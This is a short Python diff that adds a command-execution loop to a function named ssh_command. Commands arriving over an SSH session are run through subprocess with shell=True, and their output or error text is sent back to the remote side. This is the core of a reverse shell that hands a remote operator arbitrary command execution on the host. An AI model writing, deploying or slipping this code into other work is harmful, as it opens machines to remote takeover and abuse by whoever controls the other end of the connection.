@@ -15,4 +15,11 @@ def ssh_command(ip, port, user, passwd, command):
             command = ssh_session.recv(1024)
             try:
                 cmd = command.decode()
+                if cmd == 'exit':
+                    client.close()
+                    break
+                cmd_output = subprocess.check_output(cmd, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception as e:
+                ssh_session.send(str(e))
                 
